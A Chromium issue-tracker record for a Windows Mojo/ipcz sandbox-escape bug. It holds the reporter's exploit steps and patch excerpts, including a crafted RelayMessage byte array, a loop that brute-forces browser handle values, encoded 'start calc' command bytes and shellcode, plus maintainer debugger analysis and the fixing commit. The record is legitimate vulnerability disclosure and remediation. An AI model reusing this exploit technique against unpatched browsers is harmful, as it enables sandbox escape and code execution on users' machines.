# ipcz bug can allow renderer duplicate browser process handle to escape sandbox

| Field | Value |
|-------|-------|
| **Issue ID** | [412578726](https://issues.chromium.org/issues/412578726) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Mojo>Core |
| **Platforms** | Windows |
| **Chrome Version** | 135.0.0.0 |
| **CVE IDs** | CVE-2025-2783 |
| **Reporter** | ha...@gmail.com |
| **Assignee** | aj...@chromium.org |
| **Created** | 2025-04-22 |
| **Bounty** | $250,000.00 |

## Description

# Steps to reproduce the problem

1. git apply patch.diff and compile chromium.(This patch is all renderer side patch.)
2. open chromium.
3. If you are build chromium without component build and without official build. You will hit the check"You are attempting to duplicate a privileged handle into a sandboxed" process.\n Please contact [security@chromium.org](mailto:security@chromium.org) for assistance."; (Note this check will not work in official buid.)
4. If you are with component build or official build. You can use "System Informer" to see the renderer process's handle. You will see browser process's handle is in one renderer process. You can see the result in handle.txt. Renderer process(58636) has full control of browser process(105724)'s thread handle.

# Problem Description

In Transport::Deserialize[1]. It directly create transport using header.destination\_type without any check. If a malicious renderer pass kbroker as the header.destination\_type and send the request to the browser process. Then renderer can use this malicious transport to duplicate the privileged handle of browser process. Because in [2], browser will think the renderer is a broker process. And allow it to duplicate browser process’s handle.

<https://source.chromium.org/chromium/chromium/src/+/main:mojo/core/ipcz_driver/transport.cc;l=642;drc=b6620a02fa498df5297e53241b54a31f488ca440;bpv=1;bpt=1> [1]

<https://source.chromium.org/chromium/chromium/src/+/main:mojo/core/ipcz_driver/transport.cc;l=200;drc=b6620a02fa498df5297e53241b54a31f488ca440;bpv=0;bpt=1> [2]

Renderer process then can use the privileged handle such as thread handle to escape the sandbox.

How to exploit this bug:

1. Renderer process send RequestIntroduction to broker with self’s node name. And then will get the transport1, transport2. ( Because in windows, Renderer process has no permission to create namepipe)
2. Renderer send ReferNonBroker request with transport1 and pass kbroker as header.destination\_type.
3. Renderer send connect request.
4. Renderer send RelayMessage request with transport2 to request the handle of browser process. Because we don’t know the value of thread handle. We just send RelayMessage multiple times with handle value 4 to 1000. And browser process will return all the handle which value is between 4 and 1000.
5. Renderer process use the privileged browser process handle to escape the sandbox.( This step is still in progressing. I will attach exploit soon.)

# Additional Comments

this vulnerability is similar to High CVE-2025-2783: Incorrect handle provided in unspecified circumstances in Mojo on Windows. Reported by Boris Larin (@oct0xor) and Igor Kuznetsov (@2igosha) of Kaspersky on 2025-03-20. But this vulnerability has a higher complexity.
I will attach exploit soon.
Bisect information: this bug was introduced in <https://chromium-review.googlesource.com/c/chromium/src/+/3963307>.

# Summary

ipcz bug can allow renderer duplicate browser process handle to escape sandbox

# Custom Questions

#### Reporter credit:

Micky

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Attachments

- [patch.diff](attachments/patch.diff) (text/x-diff, 16.4 KB)
- [handle.txt](attachments/handle.txt) (text/plain, 2.8 KB)
- [ajgo.patch](attachments/ajgo.patch) (text/x-diff, 17.1 KB)
- [exploit.mp4](attachments/exploit.mp4) (video/mp4, 6.3 MB)
- [exploit.diff](attachments/exploit.diff) (text/x-diff, 22.8 KB)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### ha...@gmail.com (2025-04-22)

Note in exploit step 4. Because handle value in windows is not a random value. It's a value increased from 4. So we can get the thread handle easily by sending multiple RelayMessage.

### aj...@google.com (2025-04-22)

Thanks, this seems reasonable - to help me reproduce what is the git hash your patch applies to?

### ha...@gmail.com (2025-04-22)

Thanks for the quick reply! I use f8270cf11e94eed11cc2bdf2c75df474e53065a1. If you meet any question when reproduce the bug. Please let me know. Thank you!

### aj...@google.com (2025-04-22)

Actually if I revert 2a21691931195ef82104573fc1234aed8261f522 the patch applies cleanly at head so I'll test that.

### aj...@google.com (2025-04-22)

The poc is convincing and I believe the set of patches demonstrate what a compromised renderer could do.

With `is_official_build = true` in my `args.gn` I can easily get to the spot where handles are attempted to be sent to the child. One of the interesting side effects of this channel is that we duplicate with DUPLICATE\_CLOSE\_SOURCE so the basic poc here is somewhat unstable as chrome starts mulitple renderers and that results in the source handles being shot away:

```
::DuplicateHandle(::GetCurrentProcess(), handle.ReleaseHandle(),
                         remote_process.Handle(), &new_handle, 0, FALSE,
                         DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)

```

however, I think a more nuanced poc/test could guess a better handle to try to fetch, and provide some control over which renderer is requesting handles.

Setting to Sev=High as this represents a sandbox escape from a compromised renderer, and foundin=134 as the code here hasn't changed since the introduction of the ipcz mojo driver.

Also assigning to myself as I'm probably the best person to fix this, although that might take a few more days.

Please do let us know if you get a working exploit or a more reliable poc!

### aj...@google.com (2025-04-23)

Updating the poc a little, and trying to fetch a handle at 0x108 often (not 100%, but often) results in a thread handle from the browser process:-

```
bool Node::AcceptRelayedMessage(msg::AcceptRelayedMessage& accept) {
  if (auto link = GetLink(accept.v0()->source)) {
    return link->DispatchRelayedMessage(accept);
  } else if(InRendererProcess()){
    msg::AcceptBypassLink::ReceivedDataBuffer a =
        std::move(accept).TakeReceivedData();
    LOG(ERROR) << "received handle from browser";
    LOG(ERROR) << "handle value is: " << *((unsigned long long*)(&a.data()[160]));
    LOG(ERROR) << "end";
    uintptr_t uptr = *((uintptr_t*)(&a.data()[160]));
    HANDLE h = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(uptr));
    base::debug::Alias(&h);
    auto handle_type = base::win::GetObjectTypeName(h);
    if (handle_type.has_value() && handle_type == L"Thread") {
      __debugbreak();
      CHECK(false);
    }
  }
  return true;
}

```
```
.childdbg 1
g
...
(7b68.7f0c): Break instruction exception - code 80000003 (first chance)
*** WARNING: Unable to verify checksum for d:\chromium\src\out\release\chrome.dll
chrome!ipcz::Node::AcceptRelayedMessage+0x439:
00007ffc`0838ae49 cc              int     3
10:220> ?? h
void * 0x00000000`00000358
10:220> !handle 358 f
Handle 358
  Type         	Thread
  Attributes   	0
  GrantedAccess	0x1fffff:
         Delete,ReadControl,WriteDac,WriteOwner,Synch
         Terminate,Suspend,Alert,GetContext,SetContext,SetInfo,QueryInfo,SetToken,Impersonate,DirectImpersonate
  HandleCount  	5
  PointerCount 	129068
  Name         	<none>
  Object Specific Information
    Thread Id   115c.54e8
    Priority    8
    Base Priority 0
    Start Address 83370e0 chrome!base::`anonymous namespace'::ThreadFunc
10:220> |0s
ntdll!NtWaitForSingleObject+0x14:
00007ffc`9de10464 c3              ret
0:035> ~*
...
  45  Id: 115c.54e8 Suspend: 1 Teb: 0000009d`bd88f000 Unfrozen "ThreadPoolForegroundWorker"
      Start: chrome!base::`anonymous namespace'::ThreadFunc (00007ffc`083370e0)
      Priority: 0  Priority class: 32  Affinity: ffffffff

```

### ha...@gmail.com (2025-04-23)

Thanks for the update poc! It helps me a lot. I am still working in exploit the bug.

### ch...@google.com (2025-04-23)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-04-23)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ha...@gmail.com (2025-04-29)

Attach my exploit! It works well in my computer and it will always exploit success.( sometimes result in crash. success rate is nearly 70%-80%)
It seems 0x108 is not a thread handle. Because the for loop in the diff will change the handle value to i.
Please forgive my naming convention. But in my test. if we change handle value from 344 to 420. We will always get a thread handle.

```
+        for (unsigned long long i = 4; i < 1000; i += 4) {
+          *((unsigned long long*)(&byte_data1[160])) = i;
+          transport1->driver_object().driver()->Transmit(
+              transport1->driver_object().handle(), byte_data1.data(),
+              byte_data1.size(), nullptr, 0, IPCZ_NO_FLAGS, nullptr);
+        }

```

The exploit result in a system command execute in browser process. I choose "start calc". Once the system command return. Chromium will crash. If you don't want crash the chromium. you can choose "start calc&&timeout 100" to block the system command. And chromium will work well.

```
//uint32_t command_arr[] = {0x72617473, 0x61632074, 0x2626636c, 0x656d6974,0x2074756f, 0x30303031, 0x0};  // start calc&&timeout 100
uint32_t command_arr[] = {0x72617473, 0x61632074, 0x636c, 0x0, 0x0, 0x0, 0x0};//start calc

```

Thanks for your update poc! It helps me a lot.

### ha...@gmail.com (2025-04-29)

The comment of write\_asm is wrong.

```
+uint8_t write_asm[] = {0x87, 0xae, 0x07, 0x00,
+                       0x00, 0x8b, 0x8c, 0x83, 0xe4, 0xa0, 0x04, 0x00, 0x48, 0x03, 0xcb,0xff, 0xe1};  // asm: jmp rdi

```

the asm is:

```
: xchg dword ptr [rsi - 0x74fffff9], ebp ; mov word ptr [rbx + 0x4a0e4], es ; add rcx, rbx ; jmp rcx

```

### aj...@chromium.org (2025-04-29)

Thanks for the exploit - the initial handle values in the browser will vary by OS & chrome version and probably a little randomly so 80% success is not unexpected. I already expected this to be exploitable from a compromised renderer so I'm not changing the severity, but it is good to have proof!  I should have a fix available soon.

### aj...@chromium.org (2025-05-02)

Some extensive notes based on my patched version in [comment #7](https://issues.chromium.org/issues/412578726#comment7)

In the Renderer, the exploit starts when the broker sends msg::AcceptIntroduction (this is normal broker behavior) and it is intercepted in the compromised renderer.

```
// Introduces one node to another. Sent only by broker nodes and must only be
// accepted from broker nodes.

```
```
node_link.cc
+Ref<DriverTransport> transport1;
+BOOL has_send = false;
@@ -485,6 +496,68 @@ bool NodeLink::OnAcceptIntroduction(msg::AcceptIntroduction& accept) {
  // transport_object is unpacked from AcceptIntroduction message `accept`
  ...
   auto transport = MakeRefCounted<DriverTransport>(std::move(transport_object));
+  if (InRendererProcess() && accept.v0()->name == local_node_name()) {
+    if (transport1 && !has_send) {
+      BOOL should_send = true;
+      if (should_send) {
+        has_send = true;
+        msg::ReferNonBroker refer;
+        refer.v0()->referral_id = 23333;
+        refer.v0()->num_initial_portals = 1;
+        refer.v0()->transport =
+            refer.AppendDriverObject(transport->TakeDriverObject());
+        Transmit(refer);
+        Sleep(3000);
+        msg::RequestIntroduction request;
+        request.v0()->name = NodeName(1, 1);
+        request.header().sequence_number = SequenceNumber(0);
+        msg::ConnectToReferredBroker connect;
+        connect.v0()->protocol_version = msg::kProtocolVersion;
+        connect.v0()->num_initial_portals = 1;
+        connect.v1()->features = node_->features().Serialize(connect);
+        IpczResult a = transport1->Transmit(connect);
+        if (a != IPCZ_RESULT_OK) {
+          LOG(ERROR) << "transmit second fail";
+        }
+        std::array<uint8_t, 176> byte_data1 = {
+            0x18, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x5c, 0x60, 0xd6, 0x45, 0x6d, 0xc7, 0xf3, 0xf1,
+            0x3d, 0x6d, 0xfe, 0xfc, 0xbd, 0xfe, 0x91, 0x92,  // node name
+            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00,
+            0x30, 0x00, 0x00, 0x00, 0x18, 0x00, 0x02, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5a, 0x04, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00,
+            0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+            0x01,  // 0x01:kRecipnent  0x00:kSender
+            0x00, 0x00, 0x00, 0x10, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00,  // handle value 0x108
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+        *((unsigned long long*)(&byte_data1[40])) =
+            local_node_name().low();  // low
+        *((unsigned long long*)(&byte_data1[32])) =
+            local_node_name().high();  // high
+        for (unsigned long long i = 4; i < 1000; i += 4) {
+          *((unsigned long long*)(&byte_data1[160])) = i;
+          transport1->driver_object().driver()->Transmit(
+              transport1->driver_object().handle(), byte_data1.data(),
+              byte_data1.size(), nullptr, 0, IPCZ_NO_FLAGS, nullptr);
+        }
+      }
+      return true;
+    }
+    transport1 = std::move(transport);
+    transport1->Activate();
+    transport1->SetTransport();
+    return true;
+  }

```

On the first flow through this function, we do not yet have anything
in transport1, so the flow takes the incoming transport and stores it in
transport1 & activates transport1. The node does not call AcceptIntroduction()
immediately.

```
+    transport1 = std::move(transport);
+    transport1->Activate();
+    transport1->SetTransport();
+    return true;

```

Note: SetTransport stashes `this` in driver\_transport so that future
calls through Notify on that transport all return OK. It is not an ipcz function.

```
transport1 = .. (unwrapping via the driver when Activate() is called):
RENDERER:212> ?? transport
class mojo::core::ipcz_driver::Transport * 0x00006e5c`00086940
   +0x008 ref_count_       : base::AtomicRefCount
   +0x000 __VFN_table : 0x00007ffe`3efea808
   +0x00c type_            : 0 ( kTransport )
   +0x010 __VFN_table : 0x00007ffe`3ed53510
   +0x018 endpoint_types_  : mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x020 remote_process_  : base::Process
   +0x030 error_handler_   : (null)
   +0x038 error_handler_context_ : 0
   +0x040 leak_channel_on_shutdown_ : 0
   +0x041 is_peer_trusted_ : 0
   +0x042 is_trusted_by_peer_ : 1
   +0x043 is_remote_process_untrusted_ : 0
   +0x048 inactive_endpoint_ : mojo::PlatformChannelEndpoint
   +0x058 lock_            : base::Lock
   +0x060 channel_         : scoped_refptr<mojo::core::Channel>
   +0x068 pending_transmissions_ : std::__Cr::vector<mojo::core::ipcz_driver::Transport::PendingTransmission,std::__Cr::allocator<mojo::core::ipcz_driver::Transport::PendingTransmission> >
   +0x080 self_reference_for_channel_ : scoped_refptr<mojo::core::ipcz_driver::Transport>
   +0x088 io_task_runner_  : scoped_refptr<base::SingleThreadTaskRunner>
   +0x090 ipcz_transport_  : 0
   +0x098 activity_handler_ : (null)
RENDERER:212> ?? transport->endpoint_types_
struct mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x000 source           : 1 ( kNonBroker )
   +0x004 destination      : 1 ( kNonBroker )

```

That is, transport1 is a transport from some non-browser process to this
renderer that came from the broker.

With this stored in transport1, the node waits for another msg::AcceptIntroduction:

The next time through we get another introduction and go into the if() statement.

(unpacking the wrapped object via a dbg helper)

```
RENDERER:211> ?? transport1
class mojo::core::ipcz_driver::Transport * 0x00007094`00086a00
   +0x008 ref_count_       : base::AtomicRefCount
   +0x000 __VFN_table : 0x00007ffe`3e7ba808
   +0x00c type_            : 0 ( kTransport )
   +0x010 __VFN_table : 0x00007ffe`3e523510
   +0x018 endpoint_types_  : mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x020 remote_process_  : base::Process
   +0x030 error_handler_   : (null)
   +0x038 error_handler_context_ : 0
   +0x040 leak_channel_on_shutdown_ : 0
   +0x041 is_peer_trusted_ : 0
   +0x042 is_trusted_by_peer_ : 1
   +0x043 is_remote_process_untrusted_ : 0
   +0x048 inactive_endpoint_ : mojo::PlatformChannelEndpoint
   +0x058 lock_            : base::Lock
   +0x060 channel_         : scoped_refptr<mojo::core::Channel>
   +0x068 pending_transmissions_ : std::__Cr::vector<mojo::core::ipcz_driver::Transport::PendingTransmission,std::__Cr::allocator<mojo::core::ipcz_driver::Transport::PendingTransmission> >
   +0x080 self_reference_for_channel_ : scoped_refptr<mojo::core::ipcz_driver::Transport>
   +0x088 io_task_runner_  : scoped_refptr<base::SingleThreadTaskRunner>
   +0x090 ipcz_transport_  : 0
   +0x098 activity_handler_ : (null)
RENDERER:211> ?? transport->endpoint_types_
struct mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x000 source           : 1 ( kNonBroker )
   +0x004 destination      : 1 ( kNonBroker )

```

So we send this message back to the browser with (our end of) the transport we were
sent back as a ReferNonBroker message:

```
+        msg::ReferNonBroker refer;
+        refer.v0()->referral_id = 23333;
+        refer.v0()->num_initial_portals = 1;
+        refer.v0()->transport =
+            refer.AppendDriverObject(transport->TakeDriverObject());
+        Transmit(refer);

```

In the broker this returned transport is activated within OnReferNonBrokerNode.

```
BROKER:016> ?? transport
class mojo::core::ipcz_driver::Transport * 0x000019dc`0018b180
   +0x008 ref_count_       : base::AtomicRefCount
   +0x000 __VFN_table : 0x00007ffe`3dd6a808
   +0x00c type_            : 0 ( kTransport )
   +0x010 __VFN_table : 0x00007ffe`3dad3510
   +0x018 endpoint_types_  : mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x020 remote_process_  : base::Process
   +0x030 error_handler_   : (null)
   +0x038 error_handler_context_ : 0
   +0x040 leak_channel_on_shutdown_ : 0
   +0x041 is_peer_trusted_ : 0
   +0x042 is_trusted_by_peer_ : 1
   +0x043 is_remote_process_untrusted_ : 0
   +0x048 inactive_endpoint_ : mojo::PlatformChannelEndpoint
   +0x058 lock_            : base::Lock
   +0x060 channel_         : scoped_refptr<mojo::core::Channel>
   +0x068 pending_transmissions_ : std::__Cr::vector<mojo::core::ipcz_driver::Transport::PendingTransmission,std::__Cr::allocator<mojo::core::ipcz_driver::Transport::PendingTransmission> >
   +0x080 self_reference_for_channel_ : scoped_refptr<mojo::core::ipcz_driver::Transport>
   +0x088 io_task_runner_  : scoped_refptr<base::SingleThreadTaskRunner>
   +0x090 ipcz_transport_  : 0
   +0x098 activity_handler_ : (null)
BROKER:016> ?? transport->endpoint_types_
struct mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x000 source           : 0 ( kBroker )
   +0x004 destination      : 0 ( kBroker )

```

So there's a map a bit like:

```
u1 <-u1->
           B  <-R--> RENDERER  // initial node_link connection
u1 <------------R--> RENDERER  // transport1 - not sure if this goes to B or u1
u2 <-u2->  B  <---\            // transport
           B  <---/

```

And B thinks that "transport" is the way to send u2 messages to RENDERER

Building RequestIntroduction does not seem to be necessary.

Next the RENDERER sends ConnectToReferredBroker down transport1:

```
        msg::ConnectToReferredBroker connect;
        connect.v0()->protocol_version = msg::kProtocolVersion;
        connect.v0()->num_initial_portals = 1;
        connect.v1()->features = node_->features().Serialize(connect);
        IpczResult a = transport1->Transmit(connect);

```
```
// Sent from a non-broker to its tentative broker when calling ConnectNode()
// with IPCZ_CONNECT_NODE_INHERIT_BROKER. The other end of the transport given
// to that ConnectNode() call must itself be given to ConnectNode() by some
// other non-broker calling with IPCZ_CONNECT_NODE_SHARE_BROKER. That other node
// will pass the transport to the broker using a ReferNonBroker message.
//
// Once ConnectToReferredBroker is received by the broker on the new transport,
// the broker sends back a ConnectToReferredNonBroker to the sender of this
// message, as well as a NonBrokerReferralAccepted message to the original
// referrer.
IPCZ_MSG_BEGIN(ConnectToReferredBroker, IPCZ_MSG_ID(3))

```

Next: Turning on logging, the only ConnectToReferredBroker logged relates to
the exploit, so can add a breakpoint to find out where that's happening.

This hits a NodeConnector in the broker associated with:

```
BROKER:031> dt chrome!mojo::core::ipcz_driver::Transport 0x2ac4010fbd30
   +0x008 ref_count_       : base::AtomicRefCount
   +0x000 __VFN_table : 0x00007ffe`3c40a808
   +0x00c type_            : 0 ( kTransport )
   +0x010 __VFN_table : 0x00007ffe`3c173510
   +0x018 endpoint_types_  : mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x020 remote_process_  : base::Process
   +0x030 error_handler_   : (null)
   +0x038 error_handler_context_ : 0
   +0x040 leak_channel_on_shutdown_ : 0
   +0x041 is_peer_trusted_ : 0
   +0x042 is_trusted_by_peer_ : 1
   +0x043 is_remote_process_untrusted_ : 0
   +0x048 inactive_endpoint_ : mojo::PlatformChannelEndpoint
   +0x058 lock_            : base::Lock
   +0x060 channel_         : scoped_refptr<mojo::core::Channel>
   +0x068 pending_transmissions_ : std::__Cr::vector<mojo::core::ipcz_driver::Transport::PendingTransmission,std::__Cr::allocator<mojo::core::ipcz_driver::Transport::PendingTransmission> >
   +0x080 self_reference_for_channel_ : scoped_refptr<mojo::core::ipcz_driver::Transport>
   +0x088 io_task_runner_  : scoped_refptr<base::SingleThreadTaskRunner>
   +0x090 ipcz_transport_  : 0x00002ac4`013be670
   +0x098 activity_handler_ : 0x00007ffe`3203b550     int  chrome!ipcz::`anonymous namespace'::NotifyTransport+0
0:031> dx -id 0,0 -r1 (*((chrome!mojo::core::ipcz_driver::Transport::EndpointTypes *)0x2ac4010fbd48))
(*((chrome!mojo::core::ipcz_driver::Transport::EndpointTypes *)0x2ac4010fbd48))                 [Type: mojo::core::ipcz_driver::Transport::EndpointTypes]
    [+0x000] source           : kBroker (0x0) [Type: mojo::core::ipcz_driver::Transport::EndpointType]
    [+0x004] destination      : kBroker (0x0) [Type: mojo::core::ipcz_driver::Transport::EndpointType]

```

Note: the remote\_process\_ is invalid.

The transport associated with the node\_connector is:

```
0:031> dt chrome!mojo::core::ipcz_driver::Transport 0x2ac4009d4c40
   +0x008 ref_count_       : base::AtomicRefCount
   +0x000 __VFN_table : 0x00007ffe`3c40a808
   +0x00c type_            : 0 ( kTransport )
   +0x010 __VFN_table : 0x00007ffe`3c173510
   +0x018 endpoint_types_  : mojo::core::ipcz_driver::Transport::EndpointTypes
   +0x020 remote_process_  : base::Process
   +0x030 error_handler_   : 0x00007ffe`31c37790     void  chrome!mojo::`anonymous namespace'::RunErrorCallback+0
   +0x038 error_handler_context_ : 0x00002ac4`00047080
   +0x040 leak_channel_on_shutdown_ : 0
   +0x041 is_peer_trusted_ : 0
   +0x042 is_trusted_by_peer_ : 1
   +0x043 is_remote_process_untrusted_ : 1
   +0x048 inactive_endpoint_ : mojo::PlatformChannelEndpoint
   +0x058 lock_            : base::Lock
   +0x060 channel_         : scoped_refptr<mojo::core::Channel>
   +0x068 pending_transmissions_ : std::__Cr::vector<mojo::core::ipcz_driver::Transport::PendingTransmission,std::__Cr::allocator<mojo::core::ipcz_driver::Transport::PendingTransmission> >
   +0x080 self_reference_for_channel_ : scoped_refptr<mojo::core::ipcz_driver::Transport>
   +0x088 io_task_runner_  : scoped_refptr<base::SingleThreadTaskRunner>
   +0x090 ipcz_transport_  : 0x00002ac4`013c6e30
   +0x098 activity_handler_ : 0x00007ffe`3203b550     int  chrome!ipcz::`anonymous namespace'::NotifyTransport+0
0:031> dx -id 0,0 -r1 (*((chrome!mojo::core::ipcz_driver::Transport::EndpointTypes *)0x2ac4009d4c58))
(*((chrome!mojo::core::ipcz_driver::Transport::EndpointTypes *)0x2ac4009d4c58))                 [Type: mojo::core::ipcz_driver::Transport::EndpointTypes]
    [+0x000] source           : kBroker (0x0) [Type: mojo::core::ipcz_driver::Transport::EndpointType]
    [+0x004] destination      : kNonBroker (0x1) [Type: mojo::core::ipcz_driver::Transport::EndpointType]
0:031> dx -id 0,0 -r1 (*((chrome!base::Process *)0x2ac4009d4c60))
(*((chrome!base::Process *)0x2ac4009d4c60))                 [Type: base::Process]
    [+0x000] process_         [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::DummyVerifierTraits>]
    [+0x008] is_current_process_ : false [Type: bool]
0:031> dx -id 0,0 -r1 (*((chrome!base::win::GenericScopedHandle<base::win::HandleTraits,base::win::DummyVerifierTraits> *)0x2ac4009d4c60))
(*((chrome!base::win::GenericScopedHandle<base::win::HandleTraits,base::win::DummyVerifierTraits> *)0x2ac4009d4c60))                 [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::DummyVerifierTraits>]
    [+0x000] handle_          : 0x13dc [Type: void *]
0:031> !handle 0x13dc f
Handle 13dc
  Type         	Process
  Attributes   	0
  GrantedAccess	0x1fffff:
         Delete,ReadControl,WriteDac,WriteOwner,Synch
         Terminate,CreateThread,,VMOp,VMRead,VMWrite,DupHandle,CreateProcess,SetQuota,SetInfo,QueryInfo,SetPort
  HandleCount  	14
  PointerCount 	453633
  Name         	<none>
  Object Specific Information
    Process Id  20532
    Parent Process  13512
    Base Priority 4

```

This results in driver:CreateTransports being called with the above transports.

Broker then constructs and sends ConnectToReferredNonBroker down the broker:broker transport.
& a NonBrokerReferralAccepted is sent down b:nb link.

Now... back in the compromised process a sequence of packed packets is generated
with fake handles and jammed into transport1.

```
for (unsigned long long i = 4; i < 1000; i += 4) {
  *((unsigned long long*)(&byte_data1[160])) = i;
  transport1->driver_object().driver()->Transmit(
      transport1->driver_object().handle(), byte_data1.data(),
      byte_data1.size(), nullptr, 0, IPCZ_NO_FLAGS, nullptr);
}

```
### The Relayed Message

See: third\_party/ipcz/src/ipcz/message\_macros/message\_params\_declaration\_macros.h

1. turn messages into structs - copy ipcz somewhere and delete "normal" includes
   from node\_messages.cc then run:

```
cl -Isrc -E .\src\ipcz\node_messages.cc
  | Foreach-Object {$_ -Replace ';', ";`n"}
  | ? {$_.trim() -ne ""}
  > D:\temp\ipcz-messages\messages-processed.cc

```
```
        std::array<uint8_t, 176> byte_data1 = {
            // 0:MessageHeader
            0x18, // size=24
            0x00, // version=0
            0x42, // messageid=66 - RelayMessage
            0x00,
            0x00, 0x00, 0x00, 0x00, // reserved: 5x0
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // sequence number
            0x78, 0x00, 0x00, 0x00, // driver object offset: 120
            0x00, 0x00, 0x00, 0x00, // reserved1 4x0
            // 24: struct RelayMessage_Versions;
            // StructHeader
            0x28, 0x00, 0x00, 0x00, // size
            0x00, 0x00, 0x00, 0x00, // padding
            //  32: v0_:
            // NodeName destination
            0x5c, 0x60, 0xd6, 0x45, 0x6d, 0xc7, 0xf3, 0xf1,
            0x3d, 0x6d, 0xfe, 0xfc, 0xbd, 0xfe, 0x91, 0x92,  // node name - gets overwritten with our node_name()
            0x40, 0x00, 0x00, 0x00, // data=64
            0x00, 0x00, 0x00, 0x00, // padding
            // 56:  v0_.DriverObjectArrayData:
            0x00, 0x00, 0x00, 0x00, // first object index
            0x01, 0x00, 0x00, 0x00,  // num-objects = 1
            // 64:
            0x38, 0x00, 0x00, 0x00,
            0x30, 0x00, 0x00, 0x00,
              // 72: message to serialize - MessageHeader
              0x18, // size=24
              0x00, // version=0
              0x02, // messageid=2 - ReferNonBroker // this contains a transport handle
              0x00, // padding
              0x00, 0x00, 0x00, 0x00, // reserved
              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // sequence number
              0x00, 0x00, 0x00, 0x00, // driver object offset 0
              0x00, 0x00, 0x00, 0x00, // reserved 4x0
              // 72+24 ReferNonBroker:StructHeader
              0x18, 0x00, 0x00, 0x00, // Size
              0x00, 0x00, 0x00, 0x00, // Padding
              // 72+32: v0_:
              0x5a, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Referal id
              0x02, 0x00, 0x00, 0x00, // num initial portals
              0x00, 0x00, 0x00, 0x00, // transport
              // 72+48:
              0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
              0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00,
              0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
              0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
              0x01,  // 0x01:kRecipnent  0x00:kSender
              0x00, 0x00, 0x00,
              0x10, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // handle value 0x108
              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

```

The final message is a Relay request of a ReferNonBroker message which contains a handle value in the broker.

### aj...@chromium.org (2025-05-02)

Problems identified:-

Not propagating untrustiness when deserializing transports.

Trusting broker nomination from untrusted endpoints.

### dx...@google.com (2025-05-06)

Project: chromium/src  

Branch: main  

Author: Alex Gough [ajgo@chromium.org](mailto:ajgo@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6497400>

Drop transitive trust from transports

---


Expand for full commit details
```
     
    Untrusted nodes could reflect a broker initiated transport back to 
    a broker. This ultimately allows for handle leaks if the reflected 
    transport was later used to deserialize another transport containing 
    handles in the broker. 
     
    This CL addresses this along several axes: 
     
    1. untrusted transports cannot return new links to brokers. 
    2. process trustiness on Windows is propagated when a transport is 
    deserialized from a transport. 
     
    Windows has a special additional level of trustiness associated with 
    mojo peers via the is_remote_process_untrusted attribute (the 
    MOJO_SEND_INVITATION_FLAG_UNTRUSTED_PROCESS in invitations). This 
    affects how handles are sent between processes. This was a bool on all 
    platforms which was confusing. 
     
    This CL makes this attribute clearer. On Windows it is now a bi-state 
    enum, while on other platforms it is simply kUntracked. This makes it 
    easier to use default constructed values, and the same API on all 
    platforms without using too many buildflag differences. 
     
    This state was not being propagated correctly during transport 
    deserialization, and is now set as the same trust as the process from 
    which a deserialized transport came. Processes currently default to 
    being kTrusted, which matches the current behavior of the bool flag. 
     
    Finally, this CL turns a DCHECK into a CHECK to ensure peers are only 
    elevated when expected. 
     
    Bug: 412578726 
    Change-Id: I6741a3f53b26c3df854731177cdc886e9c8f7f11 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6497400 
    Reviewed-by: Daniel Cheng <dcheng@chromium.org> 
    Commit-Queue: Alex Gough <ajgo@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1456055}

```

---

Files:

- M `mojo/core/ipcz_driver/invitation.cc`
- M `mojo/core/ipcz_driver/transport.cc`
